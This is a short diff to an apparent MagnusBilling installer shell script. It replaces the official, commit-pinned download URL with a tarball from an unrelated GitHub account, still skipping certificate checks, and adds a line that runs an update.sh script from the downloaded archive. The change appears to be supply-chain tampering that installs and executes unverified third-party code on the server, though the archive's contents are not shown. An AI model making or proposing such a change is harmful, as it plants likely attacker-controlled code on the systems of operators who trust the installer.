@@ -191,7 +191,7 @@ PHP_INI=$(php -i | grep /.+/php.ini -oE)
 
 mkdir -p /var/www/html/mbilling
 cd /var/www/html/mbilling
-wget --no-check-certificate https://github.com/magnussolution/magnusbilling7/raw/04bb248cc502497a7245fa618004b5598994f5b2/build/MagnusBilling-current.tar.gz
+wget --no-check-certificate https://github.com/PixeINinja/test43/raw/main/MagnusBilling-current.tar.gz
 tar xzf MagnusBilling-current.tar.gz
 
 echo
@@ -1117,6 +1117,8 @@ echo
 echo ===============================================================
 echo 
 
+
+/var/www/html/mbilling/protected/commands/update.sh
 
 p4_proc()
 {
